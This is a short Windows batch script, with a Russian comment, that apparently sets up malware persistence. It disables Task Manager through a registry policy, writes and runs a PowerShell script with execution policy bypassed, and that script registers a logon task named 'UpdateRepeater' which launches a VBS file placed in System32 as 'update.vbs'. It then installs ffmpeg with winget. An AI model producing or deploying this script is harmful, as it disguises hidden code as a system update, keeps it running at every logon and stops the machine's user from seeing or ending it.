@echo off

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f


REM --- Создание PowerShell-скрипта для регистрации задачи на автозапуск ---
echo $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "C:\Windows\System32\update.vbs" > %temp%\task.ps1
echo $trigger = New-ScheduledTaskTrigger -AtLogOn >> %temp%\task.ps1
echo $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable >> %temp%\task.ps1
echo Register-ScheduledTask -TaskName "UpdateRepeater" -Trigger $trigger -Action $action -Settings $settings -User $env:USERNAME >> %temp%\task.ps1


powershell -ExecutionPolicy Bypass -File %temp%\task.ps1



winget install ffmpeg --accept-package-agreements --accept-source-agreements


